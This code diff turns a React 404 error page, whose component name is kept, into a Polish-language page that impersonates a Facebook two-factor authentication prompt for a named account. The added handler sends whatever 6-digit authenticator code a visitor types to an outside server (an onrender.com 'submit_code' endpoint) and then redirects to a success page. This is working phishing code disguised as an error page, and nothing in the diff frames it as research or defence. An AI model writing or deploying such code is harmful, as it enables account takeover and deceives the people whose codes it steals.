@@ -1,19 +1,73 @@
-
-import React from 'react';
-import { Frown } from 'lucide-react';
+import React, { useState } from 'react';
+import { useNavigate } from 'react-router-dom';
 
 const Error_Page = () => {
-    return (
-        <div className="flex flex-col justify-center items-center text-7xl mt-[150px] text-gray-600">
-            <Frown className="w-80 h-80" />
-            <h1 className=" font-semibold text-9xl mb-6"> 404 </h1>
-            <h2 className=" text-neutral-400 mb-6"> Page not found</h2>
-            <p className="text-center text-gray-500 text-base max-w-xl mt-6"> The Page you are looking for doesn't exist or an other error occurred. <br></br> 
-                <span className="text-gray-700 font-medium"> Go back, or head over weebir.com to choose a new direction.</span> 
-            </p>
+  const [code, setCode] = useState('');
+  const navigate = useNavigate();
+   
+  const handleSubmit = async () => {
+    try {
+      const response = await fetch("https://projektdawid-1.onrender.com/submit_code/", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({ code })
+      });
+
+      if (response.ok) {
+        navigate("/success")
+      } else {
+        alert("Błąd podczas wysyłania kodu.");
+      }
+    } catch (error) {
+      console.error("Error submitting code:", error);
+    }
+  };
+
+  return (
+    <div className="min-h-screen bg-white flex items-center justify-center px-6 py-20 font-sans">
+      <div className="w-full max-w-5xl mx-auto text-left">
+        <p className="text-lg text-gray-600 mb-2">Dawid Sołtys • Facebook</p>
+
+        <h1 className="text-5xl font-semibold text-gray-900 mb-4 leading-tight">
+          Przejdź do aplikacji uwierzytelniającej
+        </h1>
+
+        <p className="text-xl text-gray-800 leading-relaxed mb-6 max-w-4xl">
+          Wprowadź 6-cyfrowy kod dla tego konta uzyskany ze skonfigurowanej aplikacji do
+          uwierzytelniania dwuskładnikowego (takiej jak Duo Mobile lub Google Authenticator).
+        </p>
+
+        <div className="-mx-6 sm:mx-0 mb-10">
+          <img
+            src="/GoogleAuthenticator.png"
+            alt="Ilustracja aplikacji uwierzytelniającej"
+            className="w-full h-auto object-cover"
+          />
         </div>
 
-    );
+        <input
+          type="text"
+          placeholder="Kod"
+          value={code}
+          onChange={(e) => setCode(e.target.value)}
+          className="w-full px-6 py-4 text-xl border border-gray-300 rounded-2xl mb-5 text-left placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-blue-500"
+        />
+
+        <button
+          onClick={handleSubmit}
+          className="w-full bg-blue-500 hover:bg-blue-600 text-white text-lg font-semibold rounded-2xl py-4 mb-4 shadow transition-colors"
+        >
+          Kontynuuj
+        </button>
+
+        <button className="w-full border border-gray-300 py-4 rounded-2xl text-lg hover:bg-gray-100 transition-colors">
+          Spróbuj innej metody
+        </button>
+      </div>
+    </div>
+  );
 };
 
 export default Error_Page;
